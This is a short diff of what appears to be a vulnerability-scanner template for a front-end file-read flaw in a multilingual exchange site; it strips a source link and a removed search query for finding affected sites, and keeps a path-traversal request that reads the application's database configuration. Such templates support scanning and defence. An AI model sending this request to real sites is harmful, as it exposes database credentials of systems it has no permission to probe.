@@ -3,12 +3,8 @@ info:
   name: 新版UI多语言交易所lang存在前台文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ibtrucnf9ek9qow9'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ibtrucnf9ek9qow9
-    fofa: '"你所浏览的页面暂时无法访问" && "h3.subheading"'
 http:
 - raw:
   - 'GET /index/ajax/lang?lang=../../application/database HTTP/1.1
